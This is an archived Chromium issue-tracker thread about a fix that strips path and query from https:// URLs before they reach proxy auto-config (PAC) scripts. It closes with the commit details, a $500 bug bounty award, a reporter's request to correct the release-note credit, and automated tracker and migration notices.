Sanitize https:// URLs before sending them to PAC scripts.

This additionally strips the path and query components for https:// URL (embedded identity and reference fragment were already being stripped).

For debugging purposes this behavior can be disabled with the command line flag --unsafe-pac-url.

BUG=593759
R=mmenke@chromium.org

Review URL: https://codereview.chromium.org/1996773002 .

Cr-Commit-Position: refs/heads/master@{#395266}
(cherry picked from commit 81357b39c643fc746517fd6ce5cb2076b7ddc3f4)

Review URL: https://codereview.chromium.org/2058683002 .

Cr-Commit-Position: refs/branch-heads/2743@{#308}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/browser/net/proxy_service_factory.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/common/chrome_switches.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/common/chrome_switches.h
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service.h
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service_unittest.cc


### aw...@chromium.org (2016-06-29)

thanks for the detail eroman@

### aw...@chromium.org (2016-07-13)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

Congratulations, the panel has decided to award $500 for this bug!  Our finance team will be in touch in the next few weeks with more details.

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-19)

[Empty comment from Monorail migration]

### st...@gmail.com (2016-07-22)

I just noticed in the Chrome 52 release notes (http://googlechromereleases.blogspot.co.uk/2016/07/stable-channel-update.html) you've credited myself but not Alex Chapman. Could you update the credit to include both our names? Thanks!

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/593759?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Enterprise, Internals>Network>Proxy]
[Monorail blocked-on: crbug.com/chromium/616396, crbug.com/chromium/619087]
[Monorail blocking: crbug.com/chromium/619097]
[Monorail mergedwith: crbug.com/chromium/614897]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40083832)*
